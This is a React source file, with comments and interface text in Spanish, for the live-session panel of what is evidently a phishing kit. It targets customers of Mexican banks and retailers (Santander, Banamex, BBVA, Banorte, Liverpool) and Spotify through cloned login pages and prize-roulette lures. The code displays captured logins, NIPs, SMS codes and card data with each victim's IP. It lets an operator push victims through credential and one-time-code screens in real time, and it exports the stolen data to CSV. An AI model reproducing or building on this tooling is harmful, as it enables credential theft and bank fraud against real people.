import { useQuery } from "@tanstack/react-query";
import React, { useEffect, useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Separator } from "@/components/ui/separator";
import { Button } from "@/components/ui/button";
import { Eye, Clock, User, Globe, Smartphone, Key, Lock, Monitor, MessageSquare, ArrowLeft, ArrowRight, Home, Download, Trash2, ChevronLeft, ChevronRight } from "lucide-react";
import { Link } from "wouter";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import type { SessionWithData } from "@shared/schema";
import { queryClient } from "@/lib/queryClient";
import { usePermanentAuth } from "@/hooks/use-permanent-auth";
import { useToast } from "@/hooks/use-toast";

export default function SessionsPage() {
  const [wsConnected, setWsConnected] = useState(false);
  const [liveData, setLiveData] = useState<SessionWithData[]>([]);
  const [currentPage, setCurrentPage] = useState(1);
  const [sessionsPerPage] = useState(5);
  const { user } = usePermanentAuth();
  const { toast } = useToast();
  
  // Admin ve todas las sesiones, usuarios normales solo las suyas
  const endpoint = user?.role === 'admin' ? "/api/sessions" : `/api/users/${user?.id}/sessions`;

  const { data: sessions, refetch } = useQuery<SessionWithData[]>({
    queryKey: [endpoint],
    refetchInterval: 3000, // Refetch every 3 seconds as fallback
    enabled: !!user, // Solo hacer query cuando tengamos el usuario
  });

  // WebSocket connection for real-time updates
  useEffect(() => {
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${protocol}//${window.location.host}/ws`;
    const socket = new WebSocket(wsUrl);

    socket.onopen = () => {
      console.log("WebSocket connected");
      setWsConnected(true);
    };

    socket.onmessage = (event) => {
      const data = JSON.parse(event.data);
      console.log("WebSocket message:", data);

      if (data.type === 'session_created' || data.type === 'submission_created') {
        refetch(); // Refresh sessions when new data arrives
      }
    };

    socket.onclose = () => {
      console.log("WebSocket disconnected");
      setWsConnected(false);
    };

    return () => {
      socket.close();
    };
  }, [refetch]);

  const formatTimeAgo = (date: string | Date) => {
    const now = new Date();
    const then = new Date(date);
    const diffMs = now.getTime() - then.getTime();
    const diffMins = Math.floor(diffMs / (1000 * 60));
    
    if (diffMins < 1) return "Justo ahora";
    if (diffMins < 60) return `Hace ${diffMins} min`;
    const diffHours = Math.floor(diffMins / 60);
    if (diffHours < 24) return `Hace ${diffHours}h`;
    return then.toLocaleDateString();
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case "active": return "bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300";
      case "form_filled": return "bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-300";
      case "expired": return "bg-gray-100 text-gray-800 dark:bg-gray-900 dark:text-gray-300";
      default: return "bg-gray-100 text-gray-800 dark:bg-gray-900 dark:text-gray-300";
    }
  };

  const getStatusText = (status: string) => {
    switch (status) {
      case "active": return "Activa";
      case "form_filled": return "Datos Capturados";
      case "expired": return "Expirada";
      default: return status;
    }
  };

  const getScreenText = (screen: string) => {
    switch (screen) {
      case "premios": return "Ruleta de Premios";
      case "login": return "Login";
      case "nip": return "NIP";
      case "sms-verification": return "Verificación SMS";
      case "card-protection": return "Protección Tarjeta";
      case "loading": return "Cargando...";
      default: return screen || "Login";
    }
  };

  const getTemplateScreens = (templateName: string) => {
    // Santander, Banamex, BBVA, and Liverpool have the same flow
    if (templateName === "santander" || templateName === "banamex" || templateName === "bbva" || templateName === "liverpool") {
      return [
        { value: "login", label: "🔐 Pantalla de Login" },
        { value: "nip", label: "🔢 Pantalla de NIP" },
        { value: "sms-verification", label: "📱 Verificación SMS" },
        { value: "card-protection", label: "💳 Protección de Tarjeta" },
        { value: "loading", label: "⏳ Pantalla de Carga" }
      ];
    }
    
    // BBVA Premios, Banorte Premios and Santander Premios have a special flow starting with the roulette
    if (templateName === "bbva-premios" || templateName === "banorte-premios" || templateName === "santander-premios") {
      return [
        { value: "premios", label: "🎁 Ruleta de Premios" },
        { value: "login", label: "🔐 Pantalla de Login" },
        { value: "nip", label: "🔢 Pantalla de NIP" },
        { value: "sms-verification", label: "📱 Verificación SMS" },
        { value: "card-protection", label: "💳 Protección de Tarjeta" },
        { value: "loading", label: "⏳ Pantalla de Carga" }
      ];
    }
    
    // Spotify has its own flow
    if (templateName === "spotify") {
      return [
        { value: "login", label: "📧 Registro/Login" },
        { value: "payment", label: "💳 Tarjeta BBVA Digital" },
        { value: "loading", label: "⏳ Activando Premium" }
      ];
    }
    
    // Default screens for other templates
    return [
      { value: "login", label: "🔐 Pantalla de Login" },
      { value: "loading", label: "⏳ Pantalla de Carga" }
    ];
  };

  const handleScreenChange = async (sessionId: string, newScreen: string) => {
    try {
      const response = await fetch(`/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          currentScreen: newScreen,
          status: "active" // Reactivar la sesión cuando se cambie de pantalla
        })
      });
      
      if (!response.ok) {
        console.error("Failed to update screen");
        return;
      }
      
      // Invalidate and refetch sessions data
      queryClient.invalidateQueries({ queryKey: [endpoint] });
    } catch (error) {
      console.error("Error updating screen:", error);
    }
  };

  // Lógica de paginación
  const allSessions = liveData.length > 0 ? liveData : sessions || [];
  const totalPages = Math.ceil(allSessions.length / sessionsPerPage);
  const startIndex = (currentPage - 1) * sessionsPerPage;
  const endIndex = startIndex + sessionsPerPage;
  const paginatedSessions = allSessions.slice(startIndex, endIndex);
  
  // Resetear página si es necesario
  React.useEffect(() => {
    if (currentPage > totalPages && totalPages > 0) {
      setCurrentPage(1);
    }
  }, [allSessions.length, currentPage, totalPages]);
  
  const clearUserSessions = async () => {
    if (!user?.id) return;
    
    try {
      const response = await fetch('/api/sessions/clear', {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ userId: user.id }),
      });
      
      if (response.ok) {
        toast({
          title: "Sesiones limpiadas",
          description: "Todas las sesiones han sido eliminadas exitosamente.",
        });
        
        // Refresh data
        queryClient.invalidateQueries({ queryKey: [endpoint] });
        setLiveData([]);
        setCurrentPage(1);
      } else {
        throw new Error('Failed to clear sessions');
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "No se pudieron limpiar las sesiones.",
        variant: "destructive",
      });
    }
  };

  const exportToCSV = () => {
    if (!allSessions || allSessions.length === 0) {
      toast({
        title: "No hay datos",
        description: "No hay sesiones disponibles para exportar.",
        variant: "destructive",
      });
      return;
    }

    const csvData = [];
    
    // Encabezados
    csvData.push([
      "ID Sesión",
      "Sitio",
      "Dominio", 
      "Usuario",
      "Estado",
      "Pantalla Actual",
      "IP",
      "Navegador",
      "Inicio",
      "Última Actividad",
      "Campo",
      "Valor",
      "Fecha Captura"
    ]);

    // Datos de sesiones
    allSessions.forEach(session => {
      if (session.submissions && session.submissions.length > 0) {
        // Si tiene datos capturados, crear una fila por cada dato
        session.submissions.forEach(submission => {
          csvData.push([
            session.id,
            session.link.template.displayName,
            session.link.domain,
            session.link.userId,
            getStatusText(session.status),
            getScreenText(session.currentScreen || "login"),
            session.ipAddress || "N/A",
            session.userAgent || "N/A",
            new Date(session.startedAt!).toLocaleString(),
            new Date(session.lastActivity!).toLocaleString(),
            submission.fieldName,
            submission.fieldValue,
            new Date(submission.submittedAt!).toLocaleString()
          ]);
        });
      } else {
        // Si no tiene datos capturados, crear una fila solo con info de sesión
        csvData.push([
          session.id,
          session.link.template.displayName,
          session.link.domain,
          session.link.userId,
          getStatusText(session.status),
          getScreenText(session.currentScreen || "login"),
          session.ipAddress || "N/A",
          session.userAgent || "N/A",
          new Date(session.startedAt!).toLocaleString(),
          new Date(session.lastActivity!).toLocaleString(),
          "",
          "",
          ""
        ]);
      }
    });

    // Convertir a CSV
    const csvContent = csvData.map(row => 
      row.map(field => `"${String(field).replace(/"/g, '""')}"`).join(",")
    ).join("\n");

    // Crear y descargar archivo
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const link = document.createElement("a");
    const url = URL.createObjectURL(blob);
    link.setAttribute("href", url);
    link.setAttribute("download", `sesiones_${new Date().toISOString().split('T')[0]}.csv`);
    link.style.visibility = 'hidden';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    toast({
      title: "Datos exportados",
      description: "El archivo CSV ha sido descargado exitosamente.",
    });
  };

  return (
    <div className="min-h-screen bg-background">
      <div className="container mx-auto p-4 lg:p-6">
        <div className="mb-4 lg:mb-6">
          <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
            <div>
              <div className="flex items-center gap-4 mb-2">
                <Link href="/dashboard">
                  <Button variant="ghost" size="sm" className="flex items-center gap-2" data-testid="button-back-dashboard">
                    <Home className="w-4 h-4" />
                    <span className="hidden sm:inline">Regresar al Dashboard</span>
                    <span className="sm:hidden">Dashboard</span>
                  </Button>
                </Link>
              </div>
              <h1 className="text-2xl lg:text-3xl font-bold text-foreground">Sesiones en Vivo</h1>
              <p className="text-sm lg:text-base text-muted-foreground mt-2">
                Monitorea todas las sesiones y datos capturados en tiempo real
              </p>
            </div>
            <div className="flex items-center justify-between lg:justify-end gap-4">
              <div className="flex items-center space-x-2">
                <div className={`w-3 h-3 rounded-full ${wsConnected ? 'bg-green-500' : 'bg-red-500'}`} />
                <span className="text-sm text-muted-foreground">
                  {wsConnected ? 'Conectado' : 'Desconectado'}
                </span>
              </div>
              <div className="flex items-center gap-2">
                <Button
                  onClick={clearUserSessions}
                  variant="outline"
                  size="sm"
                  className="flex items-center gap-2 text-red-600 hover:text-red-700 hover:bg-red-50"
                  data-testid="button-clear-sessions"
                  disabled={!allSessions || allSessions.length === 0}
                >
                  <Trash2 className="w-4 h-4" />
                  <span className="hidden sm:inline">Limpiar Sesiones</span>
                  <span className="sm:hidden">Limpiar</span>
                </Button>
                <Button
                  onClick={exportToCSV}
                  variant="outline"
                  size="sm"
                  className="flex items-center gap-2"
                  data-testid="button-export-csv"
                  disabled={!allSessions || allSessions.length === 0}
                >
                  <Download className="w-4 h-4" />
                  <span className="hidden sm:inline">Exportar CSV</span>
                  <span className="sm:hidden">CSV</span>
                </Button>
              </div>
            </div>
          </div>
        </div>

        <div className="grid gap-4 lg:gap-6">
          {!allSessions?.length ? (
            <Card>
              <CardContent className="flex flex-col items-center justify-center py-12">
                <Eye className="w-12 h-12 text-muted-foreground mb-4" />
                <h3 className="text-lg font-semibold text-foreground mb-2">No hay sesiones activas</h3>
                <p className="text-muted-foreground text-center mb-4">
                  Para probar los controles de navegación:
                </p>
                <div className="text-sm text-muted-foreground text-center space-y-1">
                  <p>1. Ve a <strong>Links</strong> y crea un nuevo link</p>
                  <p>2. Abre el link en otra pestaña</p>
                  <p>3. Regresa aquí para usar el <strong>selector de pantallas</strong></p>
                </div>
              </CardContent>
            </Card>
          ) : (
            <>
              {paginatedSessions.map((session) => (
              <Card key={session.id} className="border-2">
                <CardHeader>
                  <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
                    <div className="flex items-center space-x-4">
                      <div className={`w-3 h-3 rounded-full ${session.link.template.brandColor} opacity-20`} style={{backgroundColor: session.link.template.brandColor}} />
                      <div className="flex-1 min-w-0">
                        <CardTitle className="text-lg truncate">
                          {session.link.template.displayName}
                        </CardTitle>
                        <CardDescription className="flex flex-col sm:flex-row sm:items-center gap-2 mt-1">
                          <span className="flex items-center">
                            <Globe className="w-4 h-4 mr-1 flex-shrink-0" />
                            <span className="truncate">{session.link.domain}</span>
                          </span>
                          <span className="flex items-center">
                            <User className="w-4 h-4 mr-1 flex-shrink-0" />
                            <span className="truncate">Usuario: {session.link.userId}</span>
                          </span>
                        </CardDescription>
                      </div>
                    </div>
                    <div className="flex flex-wrap items-center gap-2">
                      <Badge className={getStatusColor(session.status)}>
                        {getStatusText(session.status)}
                      </Badge>
                      <Badge variant="outline" className="text-xs hidden sm:inline-flex">
                        Pantalla: {getScreenText(session.currentScreen || "login")}
                      </Badge>
                      <span className="text-xs lg:text-sm text-muted-foreground flex items-center">
                        <Clock className="w-3 h-3 lg:w-4 lg:h-4 mr-1" />
                        <span className="hidden sm:inline">{formatTimeAgo(session.startedAt!)}</span>
                        <span className="sm:hidden">{formatTimeAgo(session.startedAt!).replace('Hace ', '').replace(' min', 'm').replace(' h', 'h')}</span>
                      </span>
                    </div>
                  </div>
                </CardHeader>

                <CardContent>
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-4">
                    <div className="space-y-2">
                      <h4 className="text-sm font-medium text-foreground flex items-center">
                        <Smartphone className="w-4 h-4 mr-2" />
                        Información de Dispositivo
                      </h4>
                      <div className="text-xs lg:text-sm text-muted-foreground space-y-1">
                        <p className="break-all"><strong>IP:</strong> {session.ipAddress || "No disponible"}</p>
                        <p className="break-words"><strong>Navegador:</strong> {session.userAgent || "No disponible"}</p>
                      </div>
                    </div>

                    <div className="space-y-2">
                      <h4 className="text-sm font-medium text-foreground">
                        Detalles de Sesión
                      </h4>
                      <div className="text-xs lg:text-sm text-muted-foreground space-y-1">
                        <p><strong>ID:</strong> <code className="text-xs">{session.id.slice(-8)}</code></p>
                        <p className="break-all"><strong>Link:</strong> {session.link.url}</p>
                        <p><strong>Última actividad:</strong> {formatTimeAgo(session.lastActivity!)}</p>
                      </div>
                    </div>
                  </div>

                  {/* Controles de navegación - disponibles para todas las sesiones */}
                  <Separator className="my-4" />
                  <div className="space-y-3">
                    <div className="flex flex-col sm:flex-row sm:items-center gap-2">
                      <h4 className="text-sm font-medium text-foreground flex items-center">
                        <Monitor className="w-4 h-4 mr-2" />
                        Control de Pantallas
                      </h4>
                      {session.status === "completed" && (
                        <Badge variant="secondary" className="text-xs">
                          Sesión finalizada - Controlar para reactivar
                        </Badge>
                      )}
                    </div>
                    {/* Selector dropdown */}
                    <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3">
                      <div className="flex-1 w-full">
                        <Select
                          value={session.currentScreen || "login"}
                          onValueChange={(value) => handleScreenChange(session.id, value)}
                        >
                          <SelectTrigger className="w-full" data-testid={`select-screen-${session.id}`}>
                            <SelectValue placeholder="Seleccionar pantalla" />
                          </SelectTrigger>
                          <SelectContent>
                            {getTemplateScreens(session.link.template.name).map((screen) => (
                              <SelectItem key={screen.value} value={screen.value}>
                                {screen.label}
                              </SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                      <Badge variant="outline" className="text-xs whitespace-nowrap">
                        Actual: {getScreenText(session.currentScreen || "login")}
                      </Badge>
                    </div>
                    
                    {/* Botones individuales - dinámicos según template */}
                    <div className="flex items-center gap-2 flex-wrap">
                      {session.link.template.name === "santander" || session.link.template.name === "liverpool" ? (
                        <>
                          <Button
                            size="sm"
                            variant={session.currentScreen === "login" ? "default" : "outline"}
                            onClick={() => handleScreenChange(session.id, "login")}
                            className="flex items-center space-x-1"
                            data-testid={`button-login-${session.id}`}
                          >
                            <ArrowLeft className="w-3 h-3" />
                            <span>Login</span>
                          </Button>
                          <Button
                            size="sm"
                            variant={session.currentScreen === "nip" ? "default" : "outline"}
                            onClick={() => handleScreenChange(session.id, "nip")}
                            className="flex items-center space-x-1"
                            data-testid={`button-nip-${session.id}`}
                          >
                            <Key className="w-3 h-3" />
                            <span>NIP</span>
                          </Button>
                          <Button
                            size="sm"
                            variant={session.currentScreen === "sms-verification" ? "default" : "outline"}
                            onClick={() => handleScreenChange(session.id, "sms-verification")}
                            className="flex items-center space-x-1"
                            data-testid={`button-sms-${session.id}`}
                          >
                            <MessageSquare className="w-3 h-3" />
                            <span>SMS</span>
                          </Button>
                          <Button
                            size="sm"
                            variant={session.currentScreen === "card-protection" ? "default" : "outline"}
                            onClick={() => handleScreenChange(session.id, "card-protection")}
                            className="flex items-center space-x-1"
                            data-testid={`button-card-${session.id}`}
                          >
                            <ArrowRight className="w-3 h-3" />
                            <span>Tarjeta</span>
                          </Button>
                        </>
                      ) : (
                        <Button
                          size="sm"
                          variant={session.currentScreen === "login" ? "default" : "outline"}
                          onClick={() => handleScreenChange(session.id, "login")}
                          className="flex items-center space-x-1"
                          data-testid={`button-login-${session.id}`}
                        >
                          <ArrowLeft className="w-3 h-3" />
                          <span>Login</span>
                        </Button>
                      )}
                    </div>
                  </div>

                  {session.submissions && session.submissions.length > 0 && (
                    <>
                      <Separator className="my-4" />
                      <div>
                        <h4 className="text-sm font-medium text-foreground mb-3 flex items-center">
                          <Key className="w-4 h-4 mr-2" />
                          Datos Capturados ({session.submissions.length})
                        </h4>
                        <ScrollArea className="h-32 lg:h-40">
                          <div className="space-y-2">
                            {session.submissions.map((submission, index) => (
                              <div key={submission.id} className="bg-muted rounded-lg p-3">
                                <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-1 mb-2">
                                  <span className="text-sm font-medium text-foreground flex items-center">
                                    <Lock className="w-3 h-3 mr-1 flex-shrink-0" />
                                    <span className="truncate">{submission.fieldName}</span>
                                  </span>
                                  <span className="text-xs text-muted-foreground">
                                    {formatTimeAgo(submission.submittedAt!)}
                                  </span>
                                </div>
                                <div className="text-xs lg:text-sm text-foreground bg-background rounded px-2 py-1 font-mono break-all">
                                  {submission.fieldValue}
                                </div>
                              </div>
                            ))}
                          </div>
                        </ScrollArea>
                      </div>
                    </>
                  )}

                  {(!session.submissions || session.submissions.length === 0) && session.status === "active" && (
                    <div className="text-center py-4">
                      <div className="inline-flex items-center px-3 py-1 rounded-full text-xs bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-300">
                        <Clock className="w-3 h-3 mr-1" />
                        Esperando que el usuario llene el formulario...
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
              ))}
              
              {/* Controles de paginación */}
              {totalPages > 1 && (
                <div className="flex items-center justify-between mt-6 p-4 bg-card border border-border rounded-lg">
                  <div className="text-sm text-muted-foreground">
                    Mostrando {startIndex + 1}-{Math.min(endIndex, allSessions.length)} de {allSessions.length} sesiones
                  </div>
                  <div className="flex items-center gap-2">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => setCurrentPage(prev => Math.max(prev - 1, 1))}
                      disabled={currentPage === 1}
                      data-testid="button-prev-page"
                    >
                      <ChevronLeft className="w-4 h-4" />
                      <span className="hidden sm:inline ml-1">Anterior</span>
                    </Button>
                    <div className="flex items-center gap-1">
                      {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                        const pageNum = currentPage <= 3 ? i + 1 : 
                                       currentPage >= totalPages - 2 ? totalPages - 4 + i :
                                       currentPage - 2 + i;
                        
                        if (pageNum < 1 || pageNum > totalPages) return null;
                        
                        return (
                          <Button
                            key={pageNum}
                            variant={currentPage === pageNum ? "default" : "outline"}
                            size="sm"
                            onClick={() => setCurrentPage(pageNum)}
                            className="w-8 h-8 p-0"
                            data-testid={`button-page-${pageNum}`}
                          >
                            {pageNum}
                          </Button>
                        );
                      })}
                    </div>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => setCurrentPage(prev => Math.min(prev + 1, totalPages))}
                      disabled={currentPage === totalPages}
                      data-testid="button-next-page"
                    >
                      <span className="hidden sm:inline mr-1">Siguiente</span>
                      <ChevronRight className="w-4 h-4" />
                    </Button>
                  </div>
                </div>
              )}
            </>
          )}
        </div>
      </div>
    </div>
  );
}